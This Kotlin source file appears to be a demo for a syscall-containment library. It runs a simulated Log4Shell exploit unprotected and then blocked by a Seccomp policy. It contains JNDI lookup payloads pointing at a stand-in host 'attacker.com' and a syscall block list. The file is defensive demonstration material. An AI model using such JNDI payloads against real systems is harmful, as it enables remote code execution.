package demo

import io.mazewall.enforcer.ContainmentViolationException
import java.io.File
import kotlin.system.exitProcess

fun main(args: Array<String>) {
    val mode = args.getOrNull(0) ?: "all"

    when (mode) {
        "unsafe" -> runUnsafe()
        "safe" -> runSafe()
        "profile" -> runProfileAndEnforce()
        "both" -> {
            // 'both' is a subset of 'all' (runs unsafe + safe, skips the profiler phase).
            // Prefer 'all' for the full demonstration. Use 'profile' for the profiler phase alone.
            println("Note: 'both' mode runs unsafe + safe only. Use 'all' for the complete demonstration.")
            println("=== Running in UNSAFE mode ===")
            runUnsafe()
            println("\n=== Running in SAFE mode ===")
            runSafe()
        }
        "all" -> {
            println("=== Running in UNSAFE mode ===")
            runUnsafe()
            println("\n=== Running in SAFE mode ===")
            runSafe()
            println()
            runProfileAndEnforce()
        }
        "--help", "-h", "help" -> {
            println(
                """
                Usage: DemoApp [mode]

                Modes:
                  unsafe   Simulate a Log4Shell exploit with no protection active.
                           Shows the attack succeeding and a marker file created.

                  safe     Simulate the same exploit with Policy.NO_EXEC protection.
                           Shows the kernel blocking execve() via Seccomp-BPF.

                  profile  Full Profile -> Enforce -> Breach -> io_uring evasion showcase.
                           Phases 1-6 with ANSI output. Requires Linux + Landlock support.

                  all      Run all modes sequentially (default if no argument given).

                  both     Run unsafe + safe only (subset of 'all', no profiler phase).

                  --help   Show this help message.
            """.trimIndent(),
            )
        }
        else -> {
            println("Unknown mode: '$mode'. Run with --help for usage.")
            exitProcess(1)
        }
    }
}

fun runUnsafe() {
    val marker = File("/tmp/pwned_unsafe")
    marker.delete()

    println("\u001b[31;1m[STATUS] BEHAVIORAL PROTECTION: INACTIVE\u001b[0m")
    println("Context: A vulnerable library receives a malicious payload.")
    println("Expected Behavior: Log the string.")
    println("Actual Behavior:   Exploit triggers unauthorized \u001b[1mexecve()\u001b[0m.")

    val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_unsafe}"
    UnsafeRunner.run(payload)

    if (marker.exists()) {
        println("\u001b[31;1m[SECURITY ALERT] SYSTEM COMPROMISED!\u001b[0m")
        println("The exploit successfully bypassed Java security and modified the filesystem.")
    }
}

fun runSafe() {
    val marker = File("/tmp/pwned_safe")
    marker.delete()

    println("\u001b[32;1m[STATUS] BEHAVIORAL PROTECTION: ACTIVE\u001b[0m")
    println("\u001b[34;1m[CLIPBOARD] Bill of Behavior (BoB) for 'worker-thread':\u001b[0m")
    println(
        """
        {
          "syscalls": {
            "allow": ["read", "write", "mmap", "exit"],
            "block": ["execve", "fork", "socket", "connect"],
            "action": "EPERM"
          }
        }
        """.trimIndent(),
    )

    println("Contract: \u001b[1mPolicy.NO_EXEC\u001b[0m + \u001b[1mPolicy.NO_NETWORK\u001b[0m")
    println("Context:  Malicious JNDI payload received.")

    val payload = $$"${jndi:ldap://attacker.com/Exploit?cmd=touch,/tmp/pwned_safe}"

    try {
        println("Action:   Attempting unauthorized execve()...")
        SafeRunner.run(payload)
    } catch (e: ContainmentViolationException) {
        println("\u001b[32;1m[BOUNCER] SYSCALL INTERCEPTED!\u001b[0m")
        println("The kernel verified the clipboard and blocked the operation.")
        println("Java Exception: \u001b[33m${e.javaClass.simpleName}: ${e.message}\u001b[0m")
    }

    if (!marker.exists()) {
        println("\u001b[32m[RESULT]\u001b[0m Integrity maintained. Exploit failed.")
    }
}
